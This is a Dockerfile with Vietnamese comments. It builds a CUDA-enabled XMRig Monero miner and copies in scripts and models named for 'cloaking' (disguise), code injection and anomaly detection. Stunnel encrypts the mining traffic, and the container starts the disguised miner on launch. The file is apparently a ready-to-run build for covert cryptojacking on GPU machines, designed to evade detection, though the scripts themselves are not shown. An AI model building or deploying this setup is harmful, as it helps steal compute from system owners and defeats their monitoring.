# Sử dụng nền tảng CUDA của NVIDIA
FROM nvidia/cuda:11.7.1-cudnn8-runtime-ubuntu22.04

# Cập nhật và cài đặt các công cụ cần thiết
RUN apt-get update && \
    apt-get install -y python3 python3-pip \
    curl git build-essential cmake libssl-dev \
    && apt-get clean

# Cài đặt thư viện bổ sung cho GPU
RUN apt-get install -y libnuma-dev

# Cài đặt XMRig phiên bản hỗ trợ CUDA để khai thác Monero trên GPU
RUN git clone https://github.com/xmrig/xmrig.git && \
    cd xmrig && mkdir build && cd build && \
    cmake .. -DWITH_CUDA=ON && make -j$(nproc)

# Sao chép các file cần thiết vào container
WORKDIR /app
COPY . /app

# Cài đặt các thư viện Python từ requirements.txt
RUN pip3 install --no-cache-dir -r requirements.txt

# Thiết lập môi trường cho các mô hình AI
COPY mining-environment/models/cloaking_model.h5 /app/models/
COPY mining-environment/models/anomaly_detection_model.h5 /app/models/

# Sao chép cấu hình XMRig và các file cấu hình cần thiết khác
COPY mining-environment/config/xmrig_config.json /app/config/
COPY mining-environment/config/cloaking_params.json /app/config/
COPY mining-environment/config/resource_limits.json /app/config/

# Sao chép các scripts khai thác và ngụy trang
COPY mining-environment/scripts/start_mining.py /app/scripts/
COPY mining-environment/scripts/setup_env.py /app/scripts/
COPY mining-environment/scripts/ai_environment_cloaking.py /app/scripts/
COPY mining-environment/scripts/inject_code.py /app/scripts/

# Thiết lập biến môi trường để đảm bảo mã XMRig hoạt động đúng
ENV XMRIG_CONFIG=/app/config/xmrig_config.json

# Cài đặt Stunnel cho mã hóa lưu lượng
RUN apt-get install -y stunnel4 && apt-get clean
COPY mining-environment/config/stunnel.conf /etc/stunnel/stunnel.conf

# Khởi động stunnel và cấu hình cho stunnel
RUN mkdir /var/run/stunnel && chown stunnel4:stunnel4 /var/run/stunnel

# Chạy setup_env.py để chuẩn bị môi trường khai thác
RUN python3 /app/scripts/setup_env.py

# Khởi động mã khai thác với ngụy trang AI khi container khởi động
CMD ["python3", "/app/scripts/start_mining.py"]
